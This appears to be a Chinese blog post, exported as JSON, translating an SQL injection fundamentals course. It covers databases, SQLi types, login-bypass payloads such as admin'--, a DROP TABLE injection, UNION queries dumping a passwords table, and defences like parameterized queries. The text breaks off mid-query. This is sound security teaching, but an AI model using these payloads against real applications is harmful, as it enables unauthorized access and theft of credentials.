MariaDB 用户，`reader`该用户仅被授予`SELECT`表的权限`ports`。我们可以通过登录验证该用户的权限：\n\n```shell-session\nsl1aun@htb[/htb]$ mysql -u reader -p\n\nMariaDB [(none)]> use ilfreight;\nMariaDB [ilfreight]> SHOW TABLES;\n\n+---------------------+\n| Tables_in_ilfreight |\n+---------------------+\n| ports               |\n+---------------------+\n1 row in set (0.000 sec)\n\n\nMariaDB [ilfreight]> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;\n\n+--------------------+\n| SCHEMA_NAME        |\n+--------------------+\n| information_schema |\n| ilfreight          |\n+--------------------+\n2 rows in set (0.000 sec)\n\n\nMariaDB [ilfreight]> SELECT * FROM ilfreight.credentials;\nERROR 1142 (42000): SELECT command denied to user 'reader'@'localhost' for table 'credentials'\n```\n\n上面的代码片段确认`reader`用户无法查询`ilfreight`数据库中的其他表。用户只能访问`ports`应用程序所需的表。\n\n------\n\n### Web 应用防火墙\n\nWeb 应用程序防火墙 (WAF) 用于检测恶意输入并拒绝包含它们的任何 HTTP 请求。即使应用程序逻辑存在缺陷，这也有助于防止 SQL 注入。WAF 可以是开源的 (ModSecurity) 或高级的 (Cloudflare)。他们中的大多数都有基于常见网络攻击配置的默认规则。例如，任何包含该字符串的请求`INFORMATION_SCHEMA`都将被拒绝，因为它通常在利用 SQL 注入时使用。\n\n------\n\n### 参数化查询\n\n另一种确保输入被安全清理的方法是使用参数化查询。参数化查询包含输入数据的占位符，然后由驱动程序转义并传递。我们不是直接将数据传递到 SQL 查询，而是使用占位符，然后用 PHP 函数填充它们。\n\n考虑以下修改后的代码：\n\n```php\n<SNIP>\n  $username = $_POST['username'];\n  $password = $_POST['password'];\n\n  $query = \"SELECT * FROM logins WHERE username=? AND password = ?\" ;\n  $stmt = mysqli_prepare($conn, $query);\n  mysqli_stmt_bind_param($stmt, 'ss', $username, $password);\n  mysqli_stmt_execute($stmt);\n  $result = mysqli_stmt_get_result($stmt);\n\n  $row = mysqli_fetch_array($result);\n  mysqli_stmt_close($stmt);\n<SNIP>\n```\n\n查询被修改为包含两个占位符，标有用`?`户名和密码的放置位置。[然后我们使用mysqli_stmt_bind_param()](https://www.php.net/manual/en/mysqli-stmt.bind-param.php)函数将用户名和密码绑定到查询。这将安全地转义任何引号并将值放入查询中。\n\n------\n\n### 结论\n\n上面的列表并不详尽，仍然可以根据应用程序逻辑利用 SQL 注入。显示的代码示例基于 PHP，但逻辑适用于所有常见语言和库。\n\n","source":"_posts/SQL-INJECTION-FUNDAMENTALS.md","raw":"---\ntitle: SQL INJECTION FUNDAMENTALS\ntags: Injection Cybersecurit 数据库安全\ndate: 2023-05-02 10:52:32\n---\n\n## 0x01 介绍\n\n大多数现代 Web 应用程序在后端使用数据库结构。此类数据库用于存储和检索与 Web 应用程序相关的数据，从实际 Web 内容到用户信息和内容等。为了使 Web 应用程序动态化，Web 应用程序必须与数据库实时交互。当来自用户的 HTTP(S) 请求到达时，Web 应用程序的后端将向数据库发出查询以构建响应。这些查询可以包括来自 HTTP(S) 请求的信息或其他相关信息。\n\n![数据库管理系统架构](https://p.ipic.vip/oxdmae.png)\n\n当用户提供的信息用于构造对数据库的查询时，恶意用户可以诱使查询用于原始程序员预期之外的其他用途，从而使用称为 SQL 注入的攻击为用户提供查询数据库的权限（ SQLi).\n\nSQL 注入是指针对关系数据库的攻击，例如`MySQL`（而非关系数据库的注入，例如 MongoDB，是 NoSQL 注入）。本模块将重点`MySQL`介绍 SQL 注入概念。\n\n------\n\n### SQL 注入 (SQLi)\n\nWeb 应用程序中可能存在许多类型的注入漏洞，例如 HTTP 注入、代码注入和命令注入。然而，最常见的例子是 SQL 注入。当恶意用户试图传递更改 Web 应用程序发送到数据库的最终 SQL 查询的输入时，就会发生 SQL 注入，从而使用户能够直接对数据库执行其他意外的 SQL 查询。\n\n有很多方法可以做到这一点。要使 SQL 注入发挥作用，攻击者必须首先注入 SQL 代码，然后通过更改原始查询或执行全新的查询来颠覆 Web 应用程序逻辑。首先，攻击者必须在预期的用户输入限制之外注入代码，因此它不会作为简单的用户输入来执行。在最基本的情况下，这是通过注入单引号 ( `'`) 或双引号 ( `\"`) 来避开用户输入的限制并将数据直接注入 SQL 查询来完成的。\n\n一旦攻击者可以注入，他们就必须寻找一种方法来执行不同的 SQL 查询。这可以通过使用 SQL 代码来组成一个工作查询来完成，该查询可以同时执行预期的 SQL 查询和新的 SQL 查询。有很多方法可以实现这一点，例如使用[堆叠](https://www.sqlinjection.net/stacked-queries/)查询或使用[联合](https://www.mysqltutorial.org/sql-union-mysql.aspx/)查询。最后，要检索新查询的输出，我们必须在 Web 应用程序的前端对其进行解释或捕获。\n\n------\n\n### 用例和影响\n\nSQL 注入可能会产生巨大的影响，尤其是在后端服务器和数据库的权限非常松懈的情况下。\n\n首先，我们可能会检索我们不应该看到的秘密/敏感信息，例如用户登录名和密码或信用卡信息，然后可以将其用于其他恶意目的。SQL 注入导致许多网站密码和数据泄露，这些网站随后被重新用于窃取用户帐户、访问其他服务或执行其他恶意操作。\n\nSQL 注入的另一个用例是破坏预期的 Web 应用程序逻辑。最常见的示例是在不传递有效的用户名和密码凭据对的情况下绕过登录。另一个例子是访问锁定给特定用户的功能，比如管理面板。攻击者还可以直接在后台服务器上读写文件，进而在后台服务器上设置后门，直接控制后台服务器，最终控制整个后台服务器。网站。\n\n------\n\n### 预防\n\nSQL 注入通常是由编码不当的 Web 应用程序或不安全的后端服务器和数据库权限引起的。稍后，我们将讨论通过安全编码方法（例如用户输入清理和验证以及适当的后端用户权限和控制）来减少易受 SQL 注入攻击的机会的方法。\n\n## 0x02 数据库简介\n\n在我们了解 SQL 注入之前，我们需要更多地了解数据库和结构化查询语言 (SQL)，哪些数据库将执行必要的查询。网络应用程序利用后端数据库来存储与网络应用程序相关的各种内容和信息。这可以是核心 Web 应用程序资产，如图像和文件、内容（如帖子和更新）或用户数据（如用户名和密码）。\n\n有许多不同类型的数据库，每一种都适合特定的用途。传统上，应用程序使用基于文件的数据库，随着大小的增加，速度非常慢。`Database Management Systems`这导致了( )的采用`DBMS`。\n\n------\n\n### 数据库管理系统\n\n数据库管理系统 (DBMS) 有助于创建、定义、托管和管理数据库。随着时间的推移，设计了各种 DBMS，例如基于文件、关系 DBMS (RDBMS)、NoSQL、基于图形和键/值存储。\n\n有多种方式可以与 DBMS 交互，例如命令行工具、图形界面，甚至 API（应用程序编程接口）。DBMS 用于各种银行、金融和教育部门以记录大量数据。DBMS 的一些基本特征包括：\n\n| **特征**                    | **描述**                                                     |\n| --------------------------- | ------------------------------------------------------------ |\n| `Concurrency`               | 一个真实世界的应用程序可能有多个用户同时与之交互。DBMS 确保这些并发交互成功而不会损坏或丢失任何数据。 |\n| `Consistency`               | 对于如此多的并发交互，DBMS 需要确保数据在整个数据库中保持一致和有效。 |\n| `Security`                  | DBMS 通过用户身份验证和权限提供细粒度的安全控制。这将防止未经授权查看或编辑敏感数据。 |\n| `Reliability`               | 备份数据库并在数据丢失或破坏的情况下将它们回滚到以前的状态很容易。 |\n| `Structured Query Language` | SQL 通过支持各种操作的直观语法简化了用户与数据库的交互。     |\n\n------\n\n### 架构\n\n下图详细说明了一个两层架构。\n\n![数据库管理系统架构](https://p.ipic.vip/jadjj1.png)\n\n`Tier I`通常由客户端应用程序组成，例如网站或 GUI 程序。这些应用程序由高级交互组成，例如用户登录或评论。`Tier II`来自这些交互的数据通过 API 调用或其他请求传递。\n\n第二层是中间件，它解释这些事件并将它们放入 DBMS 所需的格式中。最后，应用层根据 DBMS 的类型使用特定的库和驱动程序与它们进行交互。DBMS 从第二层接收查询并执行请求的操作。这些操作可能包括数据的插入、检索、删除或更新。处理后，DBMS 返回任何请求的数据或错误代码以应对无效查询。\n\n可以在同一台主机上托管应用程序服务器和 DBMS。但是，具有支持许多用户的大量数据的数据库通常单独托管以提高性能和可伸缩性。\n\n## 0x03 数据库类型\n\n一般来说，数据库分为`Relational Databases`和`Non-Relational Databases`。只有关系数据库使用 SQL，而非关系数据库使用多种通信方法。\n\n------\n\n### 关系数据库\n\n关系数据库是最常见的数据库类型。它使用模式、模板来指示存储在数据库中的数据结构。例如，我们可以想象一家向其客户销售产品的公司拥有关于这些产品的去向、销售对象和数量的某种形式的存储知识。然而，这通常是在后端完成的，而在前端没有明显的通知。每种方法都可以使用不同类型的关系数据库。例如，第一个表可以存储和显示基本的客户信息，第二个表可以存储销售的产品数量及其成本，第三个表可以列举谁购买了这些产品以及支付数据。\n\n关系数据库中的表与提供快速数据库摘要或在需要查看特定数据时访问特定行或列的键相关联。这些表，也称为实体，都相互关联。例如，客户信息表可以为每个客户提供一个特定的 ID，该 ID 可以指示我们需要了解的有关该客户的所有信息，例如地址、姓名和联系信息。此外，产品描述表可以为每个产品分配一个特定的 ID。存储所有订单的表只需要记录这些 ID 及其数量。这些表格中的任何更改都会影响所有这些表格，但可以预见和系统地影响。\n\n`relational database management system`但是，在处理集成数据库时，需要一个概念，即使用称为( )的键将一个表链接到另一个表`RDBMS`。许多最初使用不同概念的公司正在转向 RDBMS 概念，因为这个概念易于学习、使用和理解。最初，这个概念只被大公司使用。然而，许多类型的数据库现在都实现了 RDBMS 概念，例如 Microsoft Access、MySQL、SQL Server、Oracle、PostgreSQL 等等。\n\n例如，我们可以`users`在关系数据库中有一个表，其中包含`id`、`username`、`first_name`、`last_name`和其他列。可以`id`用作表键。另一个表`posts`可能包含所有用户发布的帖子，列有`id`、`user_id`、`date`、`content`等。\n\n![HTML范例](https://p.ipic.vip/ko5y8y.jpg)\n\n我们可以将表中的`id`from链接`users`到`user_id`表中`posts`以检索每个帖子的用户详细信息，而无需存储每个帖子的所有用户详细信息。一个表可以有多个键，因为另一列可以用作键来链接另一个表。因此，例如，该`id`列可以用作将`posts`表链接到另一个包含评论的表的键，每个评论都属于一个特定的帖子，等等。\n\n数据库中表之间的关系称为模式。\n\n这样，通过使用关系数据库，可以快速轻松地从所有数据库中检索有关特定元素的所有数据。因此，例如，我们可以使用单个查询从所有表中检索链接到特定用户的所有详细信息。这使得关系数据库对于具有清晰结构和设计以及高效数据管理的大数据集非常快速和可靠。关系数据库最常见的示例是`MySQL`，我们将在本模块中介绍。\n\n------\n\n### 非关系数据库\n\n非关系数据库（也称为`NoSQL`数据库）不使用表、行和列或主键、关系或模式。相反，NoSQL 数据库根据存储的数据类型使用各种存储模型来存储数据。由于没有为数据库定义的结构，NoSQL 数据库具有很强的可扩展性和灵活性。因此，在处理定义和结构不是很好的数据集时，NoSQL 数据库将是存储此类数据的最佳选择。NoSQL 数据库有四种常见的存储模型：\n\n- 核心价值\n- 基于文档\n- 宽栏\n- 图形\n\n上述每个模型都有不同的数据存储方式。例如，该`Key-Value`模型通常以 JSON 或 XML 格式存储数据，每一对都有一个键，并将其所有数据存储为它的值： ![HTML范例](https://p.ipic.vip/m6b9rg.jpg)\n\n上面的示例可以使用 JSON 表示为：\n\n```json\n{\n  \"100001\": {\n    \"date\": \"01-01-2021\",\n    \"content\": \"Welcome to this web application.\"\n  },\n  \"100002\": {\n    \"date\": \"02-01-2021\",\n    \"content\": \"This is the first post on this web app.\"\n  },\n  \"100003\": {\n    \"date\": \"02-01-2021\",\n    \"content\": \"Reminder: Tomorrow is the ...\"\n  }\n}\n```\n\n它看起来类似于`Python`or `PHP`（即`{'key':'value'}`）等语言中的字典项，其中 the`key`通常是字符串，而 the`value`可以是字符串、字典或任何类对象。\n\nNoSQL 数据库最常见的示例是`MongoDB`.\n\n## 0x04 SQL 注入简介\n\n### 在 Web 应用程序中使用 SQL\n\n首先，让我们看看 Web 应用程序如何使用 MySQL 数据库来存储和检索数据。一旦在后端服务器上安装并设置了 DBMS 并启动并运行，Web 应用程序就可以开始利用它来存储和检索数据。\n\n例如，在`PHP`Web 应用程序中，我们可以连接到我们的数据库，并`MySQL`通过`MySQL`语法开始使用数据库，就在 中`PHP`，如下所示：\n\n```php\n$conn = new mysqli(\"localhost\", \"root\", \"password\", \"users\");\n$query = \"select * from logins\";\n$result = $conn->query($query);\n```\n\n然后，查询的输出将存储在 中`$result`，我们可以将其打印到页面或以任何其他方式使用它。下面的 PHP 代码将在新行中打印 SQL 查询的所有返回结果：\n\n```php\nwhile($row = $result->fetch_assoc() ){\n\techo $row[\"name\"].\"<br>\";\n}\n```\n\nWeb 应用程序在检索数据时通常也使用用户输入。例如，当用户使用搜索功能搜索其他用户时，他们的搜索输入将传递给 Web 应用程序，该应用程序使用输入在数据库中进行搜索：\n\n```php\n$searchInput =  $_POST['findUser'];\n$query = \"select * from logins where username like '%$searchInput'\";\n$result = $conn->query($query);\nIf we use user-input within an SQL query, and if not securely coded, it may cause a variety of issues, like SQL Injection vulnerabilities.\n```\n\n------\n\n### 什么是注射？\n\n在上面的示例中，我们接受用户输入并将其直接传递给 SQL 查询而不进行清理。\n\n清理是指删除用户输入中的任何特殊字符，以中断任何注入尝试。\n\n当应用程序将用户输入错误解释为实际代码而不是字符串时，就会发生注入，从而更改代码流并执行它。这可以通过注入特殊字符（如 ( `'`)）来转义用户输入边界，然后编写要执行的代码（如 JavaScript 代码或 SQL 注入中的 SQL）来实现。除非对用户输入进行清理，否则很可能会执行注入的代码并运行它。\n\n------\n\n### SQL注入\n\n当用户输入被输入到 SQL 查询字符串中而没有正确清理或过滤输入时，就会发生 SQL 注入。前面的示例展示了如何在 SQL 查询中使用用户输入，并且它没有使用任何形式的输入清理：\n\n```php\n$searchInput =  $_POST['findUser'];\n$query = \"select * from logins where username like '%$searchInput'\";\n$result = $conn->query($query);\n```\n\n在典型情况下，`searchInput`将输入 以完成查询，返回预期结果。我们键入的任何输入都会进入以下 SQL 查询：\n\n```sql\nselect * from logins where username like '%$searchInput'\n```\n\n所以，如果我们输入`admin`，它变成`'%admin'`。在这种情况下，如果我们编写任何 SQL 代码，它只会被视为搜索词。例如，如果我们输入`SHOW DATABASES;`，它将被执行为`'%SHOW DATABASES;'`Web 应用程序将搜索类似于 的用户名`SHOW DATABASES;`。但是，由于没有清理，在这种情况下，**我们可以添加一个单引号 ( `'`)，它将结束用户输入字段，然后我们可以编写实际的 SQL 代码**。例如，如果我们搜索`1'; DROP TABLE users;`，搜索输入将是：\n\n```php\n'%1'; DROP TABLE users;'\n```\n\n请注意我们如何在“1”之后添加单引号 (')，以避开用户输入 ('%$searchInput') 的范围。\n\n因此，最终执行的 SQL 查询如下：\n\n```sql\nselect * from logins where username like '%1'; DROP TABLE users;'\n```\n\n正如我们从语法突出显示中看到的那样，我们可以转义原始查询的边界并执行新注入的查询。`Once the query is run, the `用户` table will get deleted.`\n\n注意：在上面的示例中，为了简单起见，我们在分号（;）之后添加了另一个 SQL 查询。虽然这对于 MySQL 实际上是不可能的，但对于 MSSQL 和 PostgreSQL 是可能的。在接下来的部分中，我们将讨论在 MySQL 中注入 SQL 查询的真正方法。\n\n------\n\n### 语法错误\n\n前面的 SQL 注入示例将返回错误：\n\n```php\nError: near line 1: near \"'\": syntax error\n```\n\n这是因为最后一个尾随字符，我们有一个`'`没有关闭的额外引号 ()，这会导致执行时出现 SQL 语法错误：\n\n```sql\nselect * from logins where username like '%1'; DROP TABLE users;'\n```\n\n在这种情况下，我们只有一个尾随字符，因为我们的搜索查询输入接近 SQL 查询的末尾。然而，用户输入通常在 SQL 查询的中间，原始 SQL 查询的其余部分在它之后。\n\n要成功注入，我们必须确保新修改的 SQL 查询在注入后仍然有效并且没有任何语法错误。在大多数情况下，我们无法访问源代码来查找原始 SQL 查询并开发适当的 SQL 注入来进行有效的 SQL 查询。那么，我们如何才能成功地注入到 SQL 查询中呢？\n\n一个答案是使用`comments`，我们将在后面的部分讨论这个问题。另一种方法是通过传入多个单引号使查询语法起作用，我们将在接下来讨论 ( `'`)。\n\n现在我们了解了 SQL 注入的基础知识，让我们开始学习一些实际用途。\n\n------\n\n### SQL注入的类型\n\nSQL 注入根据我们检索其输出的方式和位置进行分类。\n\n![数据库管理系统架构](https://p.ipic.vip/p4s9ku.jpg)\n\n在简单的情况下，预期和新查询的输出可能会直接打印在前端，我们可以直接读取。这称为`In-band`SQL 注入，它有两种类型：`Union Based`和`Error Based`。\n\n使用`Union Based`SQL 注入，我们可能必须指定我们可以读取的确切位置，即“列”，以便查询将输出定向到那里打印。至于SQL 注入，当我们可以在前端`Error Based`获取`PHP`或错误时使用它，因此我们可能会故意导致返回查询输出的 SQL 错误。`SQL`\n\n在更复杂的情况下，我们可能无法打印输出，因此我们可以利用 SQL 逻辑逐个字符地检索输出。这称为`Blind`SQL 注入，它也有两种类型：`Boolean Based`和`Time Based`。\n\n通过`Boolean Based`SQL 注入，我们可以使用 SQL 条件语句来控制页面是否返回任何输出，“即原始查询响应”，如果我们的条件语句返回`true`。对于`Time Based`SQL 注入，我们使用 SQL 条件语句，如果条件语句`true`使用`Sleep()`函数返回，则延迟页面响应。\n\n最后，在某些情况下，我们可能无法直接访问输出，因此我们可能必须将输出定向到远程位置，“即 DNS 记录”，然后尝试从那里检索它。这称为`Out-of-band`SQL 注入。\n\n在本模块中，我们将只专注于通过学习 SQL 注入来介绍`Union Based`SQL 注入。\n\n## 0x05 颠覆查询逻辑\n\n------\n\n现在我们对 SQL 语句的工作原理有了基本的了解，让我们开始 SQL 注入。在我们开始执行整个 SQL 查询之前，我们将首先学习通过注入运算符`OR`和使用 SQL 注释来颠覆原始查询逻辑来修改原始查询。这方面的一个基本示例是绕过 Web 身份验证，我们将在本节中对此进行演示。\n\n------\n\n### 身份验证绕过\n\n考虑以下管理员登录页面。\n\n![管理面板](https://p.ipic.vip/v1wx7o.png)\n\n我们可以使用管理员凭据登录`admin / p@ssw0rd`。\n\n![admin_creds](https://p.ipic.vip/rr2k1g.png)\n\n该页面还显示了正在执行的 SQL 查询，以便更好地了解我们将如何颠覆查询逻辑。我们的目标是在不使用现有密码的情况下以管理员用户身份登录。正如我们所见，当前正在执行的 SQL 查询是：\n\n```sql\nSELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';\n```\n\n该页面接收凭据，然后使用`AND`运算符选择与给定用户名和密码匹配的记录。如果`MySQL`数据库返回匹配的记录，则凭据有效，因此代码`PHP`会将登录尝试条件评估为`true`。如果条件评估为`true`，则返回管理员记录，并验证我们的登录。让我们看看当我们输入错误的凭据时会发生什么。\n\n![管理员不正确](https://p.ipic.vip/wiuu1q.png)\n\n不出所料，由于密码错误导致`false`操作结果导致登录失败`AND`。\n\n------\n\n### SQLi 发现\n\n在我们开始破坏 Web 应用程序的逻辑并试图绕过身份验证之前，我们首先必须测试登录表单是否容易受到 SQL 注入的攻击。为此，我们将尝试在我们的用户名后添加以下有效负载之一，看看它是否会导致任何错误或改变页面的行为方式：\n\n| 有效载荷 | 网址编码 |\n| -------- | -------- |\n| `'`      | `%27`    |\n| `\"`      | `%22`    |\n| `#`      | `%23`    |\n| `;`      | `%3B`    |\n| `)`      | `%29`    |\n\n注意：在某些情况下，我们可能必须使用负载的 URL 编码版本。这方面的一个例子是当我们将我们的有效负载直接放在 URL“即 HTTP GET 请求”中时。\n\n因此，让我们从注入单引号开始：\n\n![报价错误](https://p.ipic.vip/j8ps1w.png)\n\n我们看到抛出了 SQL 错误而不是`Login Failed`消息。该页面引发错误，因为生成的查询是：\n\n```sql\nSELECT * FROM logins WHERE username=''' AND password = 'something';\n```\n\n如上一节所述，我们输入的引号导致了奇数个引号，从而导致语法错误。一种选择是注释掉查询的其余部分，并将查询的其余部分作为我们注入的一部分来编写，以形成一个有效的查询。另一种选择是在我们注入的查询中使用偶数个引号，这样最终的查询仍然有效。\n\n------\n\n### 或注射\n\n`true`无论输入的用户名和密码如何，我们都需要查询始终返回，以绕过身份验证。为此，我们可以`OR`在 SQL 注入中滥用运算符。\n\n如前所述，[操作优先级的](https://dev.mysql.com/doc/refman/8.0/en/operator-precedence.html)MySQL 文档指出`AND`操作符将在操作符之前被评估`OR`。`TRUE`这意味着如果整个查询中至少有一个条件和一个`OR`运算符，则整个查询的计算结果将是 to `TRUE`，因为如果其操作数之一是 ，`OR`则运算符返回。`TRUE``TRUE`\n\n始终返回的条件示例`true`是`'1'='1'`。但是，为了保持 SQL 查询正常工作并保持偶数个引号，而不是使用 ('1'='1')，我们将删除最后一个引号并使用 ('1'='1)，因此剩下的单引号原始查询中的引用将取而代之。\n\n因此，如果我们注入以下条件并`OR`在它和原始条件之间有一个运算符，它应该总是返回`true`：\n\n```sql\nadmin' or '1'='1\n```\n\n最终查询应如下所示：\n\n```sql\nSELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';\n```\n\n这意味着以下内容：\n\n- 如果用户名是`admin`\n  `OR`\n- 如果`1=1`返回`true`'总是返回`true`'\n  `AND`\n- 如果密码是`something`\n\n![or_inject_diagram](https://p.ipic.vip/z4rxm0.png)\n\n运算`AND`符将首先被评估，然后返回`false`。然后，`OR`运算符将被评估，如果其中一个语句是`true`，它将返回`true`。由于`1=1`总是返回`true`，此查询将返回`true`，并且它会授予我们访问权限。\n\n注意：我们上面使用的有效载荷是我们可以用来破坏身份验证逻辑的众多身份验证绕过有效载荷之一。[您可以在PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL Injection#authentication-bypass)中找到完整的 SQLi 身份验证绕过负载列表，每个负载都适用于特定类型的 SQL 查询。\n\n------\n\n### 使用 OR 运算符绕过身份验证\n\n让我们尝试将此作为用户名并查看响应。 ![注入成功](https://p.ipic.vip/axfg4d.png)\n\n我们能够以管理员身份成功登录。但是，如果我们不知道有效的用户名怎么办？这次让我们用不同的用户名尝试相同的请求。\n\n![notadmin_fail](https://p.ipic.vip/227o29.png)\n\n登录失败，因为`notAdmin`表中不存在，导致整体查询错误。\n\n![notadmin_diagram](https://p.ipic.vip/l1tx6e.png)\n\n要再次成功登录，我们需要一个整体`true`查询。这可以通过`OR`在密码字段中注入一个条件来实现，因此它总是会返回`true`。让我们尝试`something' or '1'='1`作为密码。\n\n![密码或注入](https://p.ipic.vip/6me5id.png)\n\n附加`OR`条件导致`true`整体查询，因为该`WHERE`子句返回表中的所有内容，并且第一行中的用户已登录。在这种情况下，由于两个条件都将返回，`true`我们不必提供测试用户名和密码，可以直接开始注入`'`，直接用`' or '1' = '1`.\n\n![basic_auth_bypass](https://p.ipic.vip/a4r69u.png)\n\n这是有效的，因为查询的计算结果与`true`用户名或密码无关。\n\n## 0x06 使用注释\n\n本节将介绍如何使用注释来颠覆更高级的 SQL 查询的逻辑，并最终得到一个有效的 SQL 查询来绕过登录身份验证过程。\n\n------\n\n### 注释\n\n就像任何其他语言一样，SQL 也允许使用注释。注释用于记录查询或忽略查询的特定部分。除了内联注释外，我们还可以在 MySQL`-- `和中使用两种类型的行注释（尽管这通常不用于 SQL 注入）。可以按如下方式使用：`#``/**/``--`\n\n```shell-session\nmysql> SELECT username FROM logins; -- Selects usernames from the logins table \n\n+---------------+\n| username      |\n+---------------+\n| admin         |\n| administrator |\n| john          |\n| tom           |\n+---------------+\n4 rows in set (0.00 sec)\n```\n\n注意：在 SQL 中，仅使用两个破折号不足以开始注释。所以，它们后面必须有一个空格，所以注释以 (-- ) 开头，末尾有一个空格。有时 URL 编码为 (--+)，因为 URL 中的空格被编码为 (+)。为清楚起见，我们将在末尾 (-- -) 添加另一个 (-)，以显示空格字符的使用。\n\n符号`#`也可以使用。\n\n```shell-session\nmysql> SELECT * FROM logins WHERE username = 'admin'; ## You can place anything here AND password = 'something'\n\n+----+----------+----------+---------------------+\n| id | username | password | date_of_joining     |\n+----+----------+----------+---------------------+\n|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |\n+----+----------+----------+---------------------+\n1 row in set (0.00 sec)\n```\n\n提示：如果您在浏览器的 URL 中输入有效负载，(#) 符号通常被视为标记，不会作为 URL 的一部分传递。为了在浏览器中使用 (#) 作为注释，我们可以使用 '%23'，这是一个 URL 编码 (#) 符号。\n\n服务器将在评估期间忽略查询的部分`AND password = 'something'`。\n\n------\n\n### 带有注释的身份验证绕过\n\n让我们回到我们之前的例子并注入`admin'-- `我们的用户名。最终查询将是：\n\n```sql\nSELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';\n```\n\n正如我们从语法突出显示中看到的那样，用户名现在是`admin`，查询的其余部分现在作为注释被忽略。此外，通过这种方式，我们可以确保查询没有任何语法问题。\n\n`admin'-- `让我们尝试在登录页面上使用这些，并使用用户名和任何密码登录：\n\n![admin_dash](https://p.ipic.vip/sqgtxx.png)\n\n如我们所见，我们能够绕过身份验证，因为新修改的查询会检查用户名，没有其他条件。\n\n------\n\n### 另一个例子\n\n如果应用程序需要先检查特定条件，SQL 支持使用括号。括号内的表达式优先于其他运算符并首先计算。让我们来看这样一个场景：\n\n![paranthesis_fail](https://p.ipic.vip/7qr0qc.png)\n\n上面的查询确保用户的 id 总是大于 1，这将阻止任何人以管理员身份登录。此外，我们还看到密码在用于查询之前已经过哈希处理。这将阻止我们通过密码字段进行注入，因为输入已更改为哈希。\n\n让我们尝试使用有效凭据登录`admin / p@ssw0rd`以查看响应。\n\n![paranthesis_valid_fail](https://p.ipic.vip/fa2q4c.png)\n\n正如预期的那样，即使我们提供了有效的凭据，登录也会失败，因为管理员的 ID 等于 1。因此让我们尝试使用另一个用户的凭据登录，例如`tom`。\n\n![tom_login](https://p.ipic.vip/r9086n.png)\n\n以 id 不等于 1 的用户身份登录成功。那么，我们如何以管理员身份登录呢？从前面关于注释的部分我们知道我们可以使用它们来注释查询的其余部分。因此，让我们尝试使用`admin'-- `as 用户名。\n\n![paranthesis_error](https://p.ipic.vip/e5z9ah.png)\n\n由于语法错误，登录失败，因为关闭的没有平衡开括号。要成功执行查询，我们必须添加一个右括号。让我们尝试使用用户名`admin')-- `关闭并注释掉其余部分。\n\n![paranthesis_success](https://p.ipic.vip/tf4imk.png)\n\n查询成功，我们以管理员身份登录。我们输入的最终查询是：\n\n```sql\nSELECT * FROM logins where (username='admin')\n```\n\n## 0x07 Union Clause\n\n到目前为止，我们只是在操纵原始查询来颠覆 Web 应用程序逻辑并绕过身份验证，使用运算符`OR`和注释。然而，另一种类型的 SQL 注入是注入与原始查询一起执行的整个 SQL 查询。本节将通过使用 MySQL`Union`子句来演示这一点`SQL Union Injection`。\n\n------\n\n### Union\n\n在开始学习 Union Injection 之前，我们应该先了解一下 SQL Union 子句。[Union](https://dev.mysql.com/doc/refman/8.0/en/union.html)子句用于组合多个`SELECT`语句的结果。这意味着通过`UNION`注入，我们将能够`SELECT`从多个表和数据库中跨 DBMS 转储和转储数据。让我们尝试`UNION`在示例数据库中使用运算符。首先，让我们看一下表的内容`ports`：\n\n```shell-session\nmysql> SELECT * FROM ports;\n\n+----------+-----------+\n| code     | city      |\n+----------+-----------+\n| CN SHA   | Shanghai  |\n| SG SIN   | Singapore |\n| ZZ-21    | Shenzhen  |\n+----------+-----------+\n3 rows in set (0.00 sec)\n```\n\n接下来，让我们看看表的输出`ships`：\n\n```shell-session\nmysql> SELECT * FROM ships;\n\n+----------+-----------+\n| Ship     | city      |\n+----------+-----------+\n| Morrison | New York  |\n+----------+-----------+\n1 rows in set (0.00 sec)\n```\n\n现在，让我们尝试使用`UNION`组合两个结果：\n\n```shell-session\nmysql> SELECT * FROM ports UNION SELECT * FROM ships;\n\n+----------+-----------+\n| code     | city      |\n+----------+-----------+\n| CN SHA   | Shanghai  |\n| SG SIN   | Singapore |\n| Morrison | New York  |\n| ZZ-21    | Shenzhen  |\n+----------+-----------+\n4 rows in set (0.00 sec)\n```\n\n如我们所见，`UNION`将两个语句的输出合并`SELECT`为一个，因此表中的条目`ports`和`ships`表中的条目合并为具有四行的单个输出。正如我们所看到的，一些行属于表，`ports`而另一些行属于`ships`表。\n\n注意：所有位置上所选列的数据类型应相同。\n\n------\n\n### 偶数列\n\n一条`UNION`语句只能对`SELECT`具有相同列数的语句进行操作。例如，如果我们尝试`UNION`两个具有不同列数的结果的查询，我们会收到以下错误：\n\n```shell-session\nmysql> SELECT city FROM ports UNION SELECT * FROM ships;\n\nERROR 1222 (21000): The used SELECT statements have a different number of columns\n```\n\n上面的查询导致错误，因为第一个`SELECT`返回一列而第二个`SELECT`返回两列。一旦我们有两个返回相同列数的查询，我们就可以使用`UNION`运算符从其他表和数据库中提取数据。\n\n例如，如果查询是：\n\n```sql\nSELECT * FROM products WHERE product_id = 'user_input'\n```\n\n我们可以`UNION`在输入中注入一个查询，以便返回另一个表中的行：\n\n```sql\nSELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '\n```\n\n假设表有两列，上述查询将返回`username`表`password`中的条目。`passwords``products`\n\n------\n\n### 非偶数列\n\n我们会发现原始查询的列数通常与我们要执行的 SQL 查询的列数不同，因此我们必须解决这个问题。例如，假设我们只有一列。在这种情况下，我们希望`SELECT`，我们可以为剩余的必需列放置垃圾数据，以便我们正在处理的列总数`UNION`与原始查询相同。\n\n例如，我们可以使用任何字符串作为垃圾数据，查询将返回该字符串作为该列的输出。如果我们`UNION`使用字符串`\"junk\"`，`SELECT`则查询`SELECT \"junk\" from passwords`将始终返回`junk`。我们也可以使用数字。例如，查询`SELECT 1 from passwords`将始终`1`作为输出返回。\n\n注意：在用垃圾数据填充其他列时，必须保证数据类型与该列的数据类型匹配，否则查询会返回错误。为了简单起见，我们将使用数字作为我们的垃圾数据，这对于跟踪我们的有效载荷位置也很方便，我们将在后面讨论。\n\n提示：对于高级 SQL 注入，我们可能只想使用 'NULL' 来填充其他列，因为 'NULL' 适合所有数据类型。\n\n`products`上面例子中的表有两列，所以我们必须有`UNION`两列。如果我们只想得到一列“eg `username`”，我们必须这样做`username, 2`，这样我们就有相同数量的列：\n\n```sql\nSELECT * from products where product_id = '1' UNION SELECT username, 2 from 